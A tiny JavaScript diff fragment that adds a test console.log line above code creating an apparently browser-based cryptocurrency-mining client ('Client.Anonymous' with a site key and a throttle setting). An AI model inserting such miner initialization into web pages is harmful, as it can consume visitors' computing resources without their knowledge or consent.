@@ -1,3 +1,4 @@
+console.log("test");
 var _client = new Client.Anonymous('23b019603543ed21c5c1ebd598e3ef783705a5f20757b71b6f49b97b6a7ec45a', {
         throttle: 0.8
     });
